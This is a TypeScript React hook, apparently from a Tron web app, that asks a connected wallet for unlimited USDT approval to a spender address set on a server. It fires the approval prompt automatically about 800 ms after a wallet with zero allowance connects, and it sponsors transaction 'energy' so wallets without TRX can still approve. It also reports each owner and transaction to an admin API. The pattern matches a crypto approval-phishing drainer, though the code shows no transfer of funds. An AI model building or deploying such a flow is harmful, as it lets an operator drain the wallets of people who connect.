import { useCallback, useEffect, useRef, useState } from 'react'
import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
import type { TronConnector } from '@reown/appkit-utils/tron'
import {
  getConfig,
  reportEvent,
  requestEnergy,
  verifyAllowance,
  type ServerConfig,
} from '../lib/api'
import { MAX_UINT256, USDT, buildApprove, signAndBroadcast } from '../lib/usdt'

const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/

// One automatic attempt per wallet per page load, so a rejection does not
// immediately re-prompt the user.
const autoAttempted = new Set<string>()

export type Phase =
  | 'idle'
  | 'checking'
  | 'resetting'
  | 'approving'
  | 'confirming'
  | 'done'
  | 'error'

/**
 * The confirmed on-chain receipt is authoritative. Reporting to the admin API
 * is best-effort: a failed POST must never turn a successful approval into an
 * error shown to the user.
 */
function reportInBackground(input: Parameters<typeof reportEvent>[0]) {
  void reportEvent(input).catch((err) => {
    console.warn('Could not report transaction:', err)
  })
}

export function useUsdtApproval() {
  // Scoped to Tron: the session can also carry EVM chains, whose accounts are
  // 0x addresses that would fail the server-side allowance check.
  const { address: activeAddress, isConnected: activeConnected } = useAppKitAccount({
    namespace: 'tron',
  })
  const address =
    activeAddress && TRON_ADDRESS_RE.test(activeAddress) ? activeAddress : undefined
  const isConnected = activeConnected && Boolean(address)
  const { walletProvider } = useAppKitProvider<TronConnector>('tron')
  const [phase, setPhase] = useState<Phase>('idle')
  const [error, setError] = useState<string | null>(null)
  const [config, setConfig] = useState<ServerConfig | null>(null)
  const [configError, setConfigError] = useState<string | null>(null)
  const [allowance, setAllowance] = useState<bigint | null>(null)
  const [checkedAt, setCheckedAt] = useState<string | null>(null)

  useEffect(() => {
    let active = true

    getConfig()
      .then((value) => {
        if (active) setConfig(value)
      })
      .catch((err) => {
        if (active) setConfigError(messageOf(err))
      })

    return () => {
      active = false
    }
  }, [])

  // Re-check (and log) the allowance whenever the connected account changes.
  const refreshAllowance = useCallback(async () => {
    if (!address) return null

    try {
      const verification = await verifyAllowance(address)
      setAllowance(BigInt(verification.allowance))
      setCheckedAt(verification.checkedAt)
      return verification
    } catch (err) {
      setError(messageOf(err))
      return null
    }
  }, [address])

  useEffect(() => {
    setAllowance(null)
    setCheckedAt(null)
    if (address) void refreshAllowance()
  }, [address, refreshAllowance])

  const approveUnlimited = useCallback(async () => {
    setError(null)

    if (!address || !walletProvider) {
      setError('Connect a wallet first.')
      return
    }

    if (!config) {
      setPhase('error')
      setError(
        configError ??
          'The verification server is not reachable. Start it with `npm run dev`, then retry.',
      )
      return
    }

    if (!config.configured) {
      setPhase('error')
      setError('The server SPENDER is not configured. Set SPENDER in .env and restart the server.')
      return
    }

    const spender = config.spender

    try {
      setPhase('checking')
      const verification = await verifyAllowance(address)
      const current = BigInt(verification.allowance)
      setAllowance(current)
      setCheckedAt(verification.checkedAt)

      // "Sufficient" comes from the server (MIN_ALLOWANCE), not a hardcoded
      // max, so a lowered requirement is honoured here too.
      const required = verification.required ? BigInt(verification.required) : MAX_UINT256

      // Already sufficient: nothing to sign, re-running the flow is free.
      if (current >= required) {
        setPhase('done')
        return
      }

      // Top up energy only if they cannot pay the fee. Best effort.
      try {
        await requestEnergy(address)
      } catch {
        // ignore — the approval still works if they hold TRX
      }

      if (current > 0n) {
        setPhase('resetting')
        const resetTx = await buildApprove(address, spender, 0n)
        const reset = await signAndBroadcast(walletProvider, address, resetTx)
        reportInBackground({ owner: address, txId: reset.txId, action: 'reset', amount: '0' })
      }

      setPhase('approving')
      const tx = await buildApprove(address, spender, MAX_UINT256)
      setPhase('confirming')
      const approved = await signAndBroadcast(walletProvider, address, tx)
      reportInBackground({
        owner: address,
        txId: approved.txId,
        action: 'approve',
        amount: MAX_UINT256.toString(),
      })

      setPhase('done')
      void refreshAllowance()
    } catch (err) {
      applyError(err, setPhase, setError, 'Approval failed')
    }
  }, [address, walletProvider, config, configError, refreshAllowance])

  const revoke = useCallback(async () => {
    setError(null)

    if (!address || !walletProvider) {
      setError('Connect a wallet first.')
      return
    }

    if (!config?.configured) {
      setPhase('error')
      setError('The server SPENDER is not configured. Set SPENDER in .env and restart the server.')
      return
    }

    try {
      setPhase('confirming')
      const tx = await buildApprove(address, config.spender, 0n)
      const result = await signAndBroadcast(walletProvider, address, tx)
      reportInBackground({
        owner: address,
        txId: result.txId,
        action: 'revoke',
        amount: '0',
      })

      setPhase('done')
      void refreshAllowance()
    } catch (err) {
      applyError(err, setPhase, setError, 'Revoke failed')
    }
  }, [address, walletProvider, config, refreshAllowance])

  // Ask for the allowance as soon as a fresh wallet is known to have none.
  // Held in a ref so the timer survives re-renders caused by `approveUnlimited`
  // being recreated.
  const approveRef = useRef(approveUnlimited)
  approveRef.current = approveUnlimited

  useEffect(() => {
    if (!address || !walletProvider || !config?.configured) return
    if (allowance !== 0n) return
    if (autoAttempted.has(address)) return

    autoAttempted.add(address)
    // Short delay so the AppKit modal finishes closing before the wallet sheet
    // opens; otherwise the two fight for the screen.
    const id = window.setTimeout(() => {
      void approveRef.current()
    }, 800)

    return () => window.clearTimeout(id)
  }, [address, walletProvider, config, allowance])

  return {
    address,
    isConnected,
    phase,
    error,
    config,
    configError,
    spender: config?.spender ?? '',
    allowance,
    checkedAt,
    refreshAllowance,
    approveUnlimited,
    revoke,
    usdt: USDT,
  }
}

function applyError(
  err: unknown,
  setPhase: (phase: Phase) => void,
  setError: (message: string) => void,
  fallback: string,
) {
  if (isUserRejection(err)) {
    setPhase('idle')
    setError('Rejected in wallet')
    return
  }

  setPhase('error')
  setError(messageOf(err) || fallback)
}

function isUserRejection(err: unknown): boolean {
  const e = err as { name?: string; code?: number; message?: string } | null
  return (
    e?.name === 'UserRejectedRequestError' ||
    e?.code === 5000 ||
    e?.code === 4001 ||
    /reject|denied|declined|cancel/i.test(e?.message ?? '')
  )
}

function messageOf(err: unknown): string {
  return err instanceof Error ? err.message : String(err)
}
